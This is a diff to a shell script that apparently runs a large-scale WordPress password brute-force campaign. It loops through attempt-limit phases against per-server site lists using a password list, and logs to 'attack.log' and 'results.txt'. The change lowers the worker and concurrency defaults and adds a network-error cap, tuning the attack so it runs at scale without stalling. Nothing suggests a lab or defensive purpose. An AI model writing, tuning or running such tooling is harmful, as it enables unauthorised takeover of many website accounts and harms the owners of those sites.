@@ -21,12 +21,13 @@ for LIM in ${PHASES:-150 500 0}; do
             -sites "/root/wordpress.s$IDX" \
             -passlist pass.txt \
             -output results.txt \
-            -max-workers "${WORKERS_PER_BOX:-3000}" \
-            -max-active-sites "${ACTIVE_PER_BOX:-2500}" \
-            -prep-workers "${PREP_PER_BOX:-768}" \
+            -max-workers "${WORKERS_PER_BOX:-1500}" \
+            -max-active-sites "${ACTIVE_PER_BOX:-1200}" \
+            -prep-workers "${PREP_PER_BOX:-400}" \
             -max-attempts "$LIM" \
             -timeout "${TIMEOUT:-12}" \
             -prep-timeout "${PREP_TIMEOUT:-10}" \
+            -net-error-cap "${NET_ERROR_CAP:-5}" \
             -verbose >> attack.log 2>&1
         rc=$?
         # Wait for this phase's process to disappear before the next one starts,
